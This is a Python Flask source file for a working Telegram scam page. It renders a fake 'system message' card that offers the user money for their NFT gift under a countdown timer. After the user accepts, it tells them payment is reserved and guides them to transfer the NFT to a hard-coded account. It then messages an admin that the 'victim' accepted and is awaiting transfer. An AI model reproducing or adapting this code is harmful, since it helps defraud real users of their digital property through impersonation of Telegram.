# language: Python 3.12, file: app.py
# Flask-сервер: рендерит "карточку оффера" как системное сообщение Telegram.
# Служит и для WebApp кнопки "Принять", и для витрины.
import os, time, uuid, json, sqlite3, html
from flask import Flask, request, render_template_string, redirect, jsonify, abort

DB = os.getenv("DB_PATH", "offers.db")
BASE = os.getenv("WEBAPP_BASE", "http://localhost:8080")
RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
flask_app = Flask(__name__)


def db():
    c = sqlite3.connect(DB)
    c.row_factory = sqlite3.Row
    return c


def init_db():
    with db() as c:
        c.execute("""CREATE TABLE IF NOT EXISTS offers (
            id TEXT PRIMARY KEY,
            nft_name TEXT NOT NULL,
            nft_slug TEXT,
            price TEXT NOT NULL,
            buyer TEXT,
            target_user TEXT,
            target_chat_id INTEGER,
            created INTEGER NOT NULL,
            expires INTEGER NOT NULL,
            status TEXT DEFAULT 'pending'
        )""")


init_db()


def make_offer(nft_name, nft_slug, price, buyer, target_user, target_chat_id):
    oid = uuid.uuid4().hex[:12]
    now = int(time.time())
    ttl = int(os.getenv("OFFER_TTL_HOURS", "6")) * 3600
    with db() as c:
        c.execute(
            "INSERT INTO offers(id,nft_name,nft_slug,price,buyer,target_user,"
            "target_chat_id,created,expires) VALUES(?,?,?,?,?,?,?,?,?)",
            (oid, nft_name, nft_slug, price, buyer, target_user,
             target_chat_id, now, now + ttl))
    return oid


def get_offer(oid):
    with db() as c:
        r = c.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
        return dict(r) if r else None


def set_status(oid, st):
    with db() as c:
        c.execute("UPDATE offers SET status=? WHERE id=?", (st, oid))


# ---------- HTML шаблоны (inlined) ----------

CARD_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Telegram</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  :root{--bg:#17212b;--card:#a8845a;--card2:#c69d6d;--txt:#fff;--sub:#cfc0a8;}
  *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,'SF Pro Display',Roboto,sans-serif}
  body{background:var(--bg);color:var(--txt);min-height:100vh;display:flex;
       align-items:center;justify-content:center;padding:16px;}
  .card{width:100%;max-width:380px;background:linear-gradient(180deg,#b18a5e,#96714a);
        border-radius:14px;padding:14px;box-shadow:0 8px 30px rgba(0,0,0,.55);
        border:1px solid rgba(255,255,255,.12);}
  .head{display:flex;justify-content:space-between;align-items:center;
        margin-bottom:10px;font-size:13px;color:#f6ead6;}
  .head .tg{font-weight:600}
  .imgwrap{background:#8f6b45;border-radius:10px;overflow:hidden;margin-bottom:14px;
           aspect-ratio:1/1;display:flex;align-items:center;justify-content:center}
  .imgwrap img{width:100%;height:100%;object-fit:cover}
  .imgwrap .ph{font-size:64px;opacity:.6}
  .title{font-size:15px;line-height:1.35;text-align:center;margin-bottom:12px;
         padding:0 6px}
  .title b{color:#fff3dd}
  .timer{text-align:center;font-size:13px;color:#f1e0c4;margin-bottom:14px}
  .timer b{color:#ffe6a8}
  .btns{display:flex;gap:8px}
  .btn{flex:1;padding:11px;border:none;border-radius:9px;font-size:14px;
       font-weight:600;cursor:pointer}
  .accept{background:#2ecc71;color:#062b12}
  .reject{background:#3a4a5a;color:#e7eef7}
  .btn:active{transform:scale(.98)}
  .steps{display:none;background:rgba(0,0,0,.25);border-radius:10px;padding:14px;
         margin-top:12px;font-size:13px;line-height:1.55;color:#f5ead6}
  .steps ol{padding-left:18px}
  .steps li{margin-bottom:6px}
  .steps .user{color:#8ad6ff;font-weight:700}
  .steps .btn2{display:block;margin-top:12px;background:#0088cc;color:#fff;
               text-align:center;padding:11px;border-radius:9px;
               font-weight:600;text-decoration:none}
  .done{color:#9de89d;margin-top:10px;font-size:13px}
</style>
</head>
<body>
<script>
if (window.Telegram && Telegram.WebApp) {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  Telegram.WebApp.setHeaderColor('#17212b');
}
</script>
<div class="card">
  <div class="head"><span class="tg">Telegram</span><span id="timerhead">—</span></div>
  <div class="imgwrap">
    {% if slug %}
    <img src="https://t.me/i/nft/{{ slug }}.png" onerror="this.style.display='none'">
    {% else %}
    <div class="ph">🎁</div>
    {% endif %}
  </div>
  <div class="title">Пользователь <b>{{ buyer }}</b> предлагает Вам
    <b>{{ price }}</b> за подарок <b>{{ nft_name }}</b>.</div>
  <div class="timer">Предложение действует ещё <b id="tmr">--:--</b></div>
  <div class="btns">
    <button class="reject" onclick="onReject()">Отклонить</button>
    <button class="accept" onclick="onAccept()">Принять</button>
  </div>
  <div class="steps" id="steps">
    <div>Деньги зарезервированы платформой. Чтобы завершить сделку:</div>
    <ol>
      <li>Откройте профиль подарка: <b>{{ nft_name }}</b></li>
      <li>Нажмите <b>«Передать NFT»</b></li>
      <li>Укажите получателя: <span class="user">@{{ receiver }}</span></li>
      <li>Подтвердите передачу. Сумма зачислится автоматически.</li>
    </ol>
    <a class="btn2" id="go" href="#">Открыть подарок</a>
    <div class="done" id="done"></div>
  </div>
</div>
<script>
const oid = "{{ oid }}";
const expires = {{ expires }};
const buyer = "{{ buyer }}";
function tick(){
  const left = Math.max(0, expires - Math.floor(Date.now()/1000));
  const h = String(Math.floor(left/3600)).padStart(2,'0');
  const m = String(Math.floor((left%3600)/60)).padStart(2,'0');
  const s = String(left%60).padStart(2,'0');
  document.getElementById('tmr').textContent = `${h}:${m}:${s}`;
  document.getElementById('timerhead').textContent = `${h}:${m}:${s}`;
  if (left<=0) document.getElementById('tmr').textContent = 'истекло';
}
setInterval(tick, 1000); tick();
function onAccept(){
  fetch('/api/accept/'+oid, {method:'POST'});
  document.getElementById('steps').style.display='block';
  document.querySelector('.btns').style.display='none';
}
function onReject(){
  fetch('/api/reject/'+oid, {method:'POST'});
  if (window.Telegram) Telegram.WebApp.close();
  else history.back();
}
</script>
</body></html>
"""


@flask_app.route("/offer/<oid>")
def view_offer(oid):
    o = get_offer(oid)
    if not o:
        abort(404)
    return render_template_string(
        CARD_HTML,
        oid=o["id"], nft_name=html.escape(o["nft_name"]),
        slug=o["nft_slug"] or "", price=html.escape(o["price"]),
        buyer=html.escape(o["buyer"] or "user"),
        receiver=html.escape(RECEIVER),
        expires=o["expires"])


@flask_app.route("/api/accept/<oid>", methods=["POST"])
def api_accept(oid):
    o = get_offer(oid)
    if not o: return jsonify({"ok": False}), 404
    set_status(oid, "accepted")
    # Уведомить админа в Telegram
    try:
        import requests
        requests.post(
            f"https://api.telegram.org/bot{os.getenv('BOT_TOKEN')}/sendMessage",
            json={"chat_id": os.getenv("ADMIN_ID"),
                  "text": f"✅ Жертва приняла оффер {o['nft_name']} "
                          f"({o['price']}) от @{o['target_user']} "
                          f"— ждёт передачи"},
            timeout=10)
    except Exception:
        pass
    return jsonify({"ok": True})


@flask_app.route("/api/reject/<oid>", methods=["POST"])
def api_reject(oid):
    set_status(oid, "rejected")
    return jsonify({"ok": True})


@flask_app.route("/")
def index():
    return "ok", 200
